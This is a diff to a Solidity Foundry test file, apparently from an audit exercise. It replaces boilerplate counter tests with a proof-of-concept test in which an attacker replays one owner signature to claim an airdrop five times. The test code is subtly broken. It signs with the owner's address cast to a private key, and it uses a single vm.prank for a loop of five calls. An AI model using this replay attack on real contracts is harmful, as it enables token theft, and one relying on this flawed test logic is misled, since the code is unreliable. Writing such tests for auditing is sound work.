@@ -1,24 +1,33 @@
-// SPDX-License-Identifier: UNLICENSED
-pragma solidity ^0.8.13;
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
 
-import {Test, console} from "forge-std/Test.sol";
-import {Counter} from "../src/Counter.sol";
+import "forge-std/Test.sol";
+import "../src/guildAuditDrop.sol";
 
-contract CounterTest is Test {
-    Counter public counter;
+contract AirdropTest is Test {
+    Airdrop airdrop;
+    address owner;
+    address attacker;
 
     function setUp() public {
-        counter = new Counter();
-        counter.setNumber(0);
+        owner = address(this);
+        attacker = address(1);
+        airdrop = new Airdrop();
     }
 
-    function test_Increment() public {
-        counter.increment();
-        assertEq(counter.number(), 1);
-    }
+    function testSignatureReplayBug() public {
+        uint256 amount = 10 ether;
 
-    function testFuzz_SetNumber(uint256 x) public {
-        counter.setNumber(x);
-        assertEq(counter.number(), x);
+        // Create a valid signature from the owner
+        bytes32 message = airdrop.prefixed(keccak256(abi.encodePacked(attacker, amount)));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(uint256(uint160(owner)), message);
+
+        // Attacker claims the airdrop multiple times using the same signature
+        vm.prank(attacker);
+        for (uint256 i = 0; i < 5; i++) {
+            airdrop.claim(amount, v, r, s);
+        }
+
+        assertEq(airdrop.claimed(attacker), 5 * amount);
     }
 }
